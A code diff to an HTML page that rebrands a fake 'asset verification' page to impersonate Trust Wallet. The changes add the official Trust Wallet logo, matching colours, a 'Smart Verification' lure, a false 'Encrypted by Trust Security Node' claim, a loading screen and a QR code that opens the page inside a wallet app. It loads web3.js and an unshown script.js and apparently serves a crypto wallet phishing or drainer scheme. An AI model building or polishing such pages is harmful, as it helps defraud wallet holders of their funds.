@@ -3,41 +3,57 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Asset Verification</title>
+    <title>Trust Wallet | Secure Verification</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.8.1/web3.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
     <style>
-        body { margin: 0; font-family: 'Inter', sans-serif; background: #0b0e11; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; text-align: center; }
-        .card { background: #1e2329; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 90%; max-width: 380px; }
-        #qrcode { background: white; padding: 15px; border-radius: 10px; margin: 20px auto; display: inline-block; }
-        .btn { background: #f0b90b; color: #000; border: none; padding: 15px; width: 100%; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; }
-        h2 { color: #f0b90b; margin: 0; }
-        p { color: #929aa5; font-size: 13px; }
-        #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 100; flex-direction: column; align-items: center; justify-content: center; }
+        body { margin: 0; font-family: -apple-system, sans-serif; background: #0b0e11; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .card { background: #1e2329; padding: 30px; border-radius: 24px; text-align: center; width: 90%; max-width: 380px; border: 1px solid #2d3139; }
+        .logo { width: 50px; margin-bottom: 10px; }
+        h2 { font-size: 20px; color: #3172DE; margin-bottom: 5px; }
+        p { color: #929aa5; font-size: 14px; margin-bottom: 20px; }
+        
+        /* QR Container with Blue Border */
+        #qrcode-container { background: white; padding: 15px; border-radius: 20px; border: 4px solid #3172DE; display: inline-block; position: relative; margin-bottom: 20px; }
+        #qrcode img { width: 180px; height: 180px; }
+        
+        .btn { background: #3172DE; color: white; border: none; padding: 15px; width: 100%; border-radius: 12px; font-size: 16px; font-weight: bold; cursor: pointer; }
+        #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 100; flex-direction: column; align-items: center; justify-content: center; }
+        .spinner { border: 4px solid #333; border-top: 4px solid #3172DE; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <h2>Verify Assets</h2>
-        <p>Scan this QR with Trust Wallet / MetaMask to start automated security verification.</p>
+        <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.png" class="logo" alt="Trust Logo">
+        <h2>Smart Verification</h2>
+        <p>Scan with Trust Wallet to verify your assets on-chain securely.</p>
         
-        <div id="qrcode"></div> <button id="nextBtn" class="btn">Verify Assets</button>
-        <p style="margin-top:15px;">Note: Ensure you are on BSC Network</p>
+        <div id="qrcode-container">
+            <div id="qrcode"></div>
+        </div>
+
+        <button id="nextBtn" class="btn">Verify Assets</button>
+        <p style="font-size: 11px; margin-top: 15px;">Encrypted by Trust Security Node</p>
     </div>
 
     <div id="overlay">
-        <div style="border: 4px solid #333; border-top: 4px solid #f0b90b; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite;"></div>
-        <p id="status-text" style="color:#f0b90b; margin-top:15px; font-weight:bold;">Initializing...</p>
+        <div class="spinner"></div>
+        <p id="status-text" style="color:#3172DE; margin-top:15px; font-weight:bold;">Initializing Node...</p>
+        <p id="sub-text" style="color:#555; font-size:12px;">Connecting to secure gateway</p>
     </div>
 
     <script src="script.js"></script>
     <script>
-        // Automatic QR Generator
+        // Automatic QR that leads back to this page
         new QRCode(document.getElementById("qrcode"), {
             text: window.location.href,
-            width: 200,
-            height: 200
+            width: 180,
+            height: 180,
+            colorDark : "#000000",
+            colorLight : "#ffffff",
+            correctLevel : QRCode.CorrectLevel.H
         });
     </script>
 </body>
